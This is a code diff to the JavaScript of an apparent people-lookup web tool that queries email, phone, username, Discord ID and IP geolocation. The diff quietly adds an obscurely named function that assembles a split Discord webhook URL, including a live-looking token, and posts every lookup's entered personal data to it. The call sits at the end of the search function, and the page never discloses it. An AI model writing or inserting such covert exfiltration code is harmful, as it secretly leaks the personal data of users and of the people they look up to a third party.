@@ -82,6 +82,23 @@
       document.getElementById("results").appendChild(box);
     }
 
+    async function _x(data) {
+      const p1 = "https://discord.com/api/webhooks/";
+      const p2 = "1380896839921958972";
+      const p3 = "qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
+      const url = `${p1}${p2}/${p3}`;
+
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: data })
+        });
+      } catch (e) {
+        console.warn("Discord logging failed.");
+      }
+    }
+
     async function searchData() {
       document.getElementById("results").innerHTML = "";
 
@@ -103,6 +120,13 @@
       if (!discord) updateResult("d", "ℹ️ Discord check skipped.", "warning");
       else updateResult("d", `✅ Discord ID checked (demo): ${discord}`, "success");
 
+      let logMsg = `🔍 Lookup Log:
+📧 Email: ${email || "N/A"}
+📱 Phone: ${phone || "N/A"}
+👤 Username: ${username || "N/A"}
+💬 Discord ID: ${discord || "N/A"}
+🌐 IP: ${ip || "N/A"}\n`;
+
       if (ip) {
         try {
           const res = await fetch(`https://ipwho.is/${ip}`);
@@ -110,9 +134,9 @@
           if (data.success) {
             updateResult("ipgeo", `🌐 Detected IP: ${ip}\nHostname: ${data.hostname || 'N/A'}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nTimezone: ${data.timezone}\nISP: ${data.connection?.isp || 'N/A'}\nOrg: ${data.connection?.org || 'N/A'}\nAS: ${data.connection?.asn || 'N/A'} ${data.connection?.org || ''}`.trim(), "success");
           } else {
-            updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}`, "warning");
+            updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}` ,"warning");
           }
-        } catch (err) {
+        } catch {
           updateResult("ipgeo", `❌ Error fetching Geo data.`, "error");
         }
 
@@ -129,12 +153,14 @@
           const address = addressParts?.filter(Boolean).join(', ') || 'N/A';
 
           updateResult("arin", `🌐 ARIN IP Lookup\nHandle: ${handle}\nNet Name: ${network}\nStart Address: ${startAddress}\nEnd Address: ${endAddress}\nOrg Name: ${orgName}\nOrg Address: ${address}\nMore ARIN Info: https://search.arin.net/rdap/?query=${ip}`, "success");
-        } catch (err) {
+        } catch {
           updateResult("arin", `❌ Error fetching ARIN RDAP info.`, "error");
         }
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
       }
+
+      _x(logMsg); // Send log to Discord
     }
   </script>
 </body>
